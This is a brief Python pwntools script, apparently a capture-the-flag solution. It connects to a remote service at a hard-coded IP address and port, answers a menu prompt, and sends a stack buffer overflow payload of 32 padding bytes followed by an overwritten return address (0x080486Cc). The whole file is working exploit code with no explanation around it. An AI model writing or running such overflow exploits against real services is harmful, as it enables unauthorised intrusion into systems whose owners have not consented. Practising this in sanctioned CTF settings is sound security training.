from pwn import *

r = remote('111.198.29.45', 46954)

r.recvuntil(">")
r.sendline("buyi")

r.recvuntil(">")
pay = 'M' * 32 + p32(0x080486Cc)
r.sendline(pay)

print r.recv()
print r.recv()
print r.recv()
